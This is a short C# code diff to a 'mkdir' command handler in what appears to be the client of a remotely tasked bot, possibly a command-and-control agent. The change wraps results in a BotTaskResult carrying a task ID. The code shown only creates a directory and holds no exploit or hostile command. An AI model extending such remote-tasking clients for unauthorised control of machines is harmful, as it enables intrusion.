@@ -9,13 +9,17 @@ namespace pattaya_project_client.Commands.Implements
     {
         public override string TaskName => "mkdir";
 
-        public override string RunTask(BotTask task)
+        public override BotTaskResult RunTask(BotTask task)
         {
             string path;
             var arguments = task.Arguments.Split(' ');
             if (arguments is null || arguments.Length == 0)
             {
-                return "No path provided";
+                return new BotTaskResult
+                {
+                    TaskId = task.TaskId,
+                    Result = "No path provided"
+                };
             }
             else
             {
@@ -23,7 +27,12 @@ namespace pattaya_project_client.Commands.Implements
             }
 
             var dirInfo = Directory.CreateDirectory(path);
-            return $"{dirInfo.FullName} created";
+            
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = $"{dirInfo.FullName} created"
+            };
         }
     }
 }
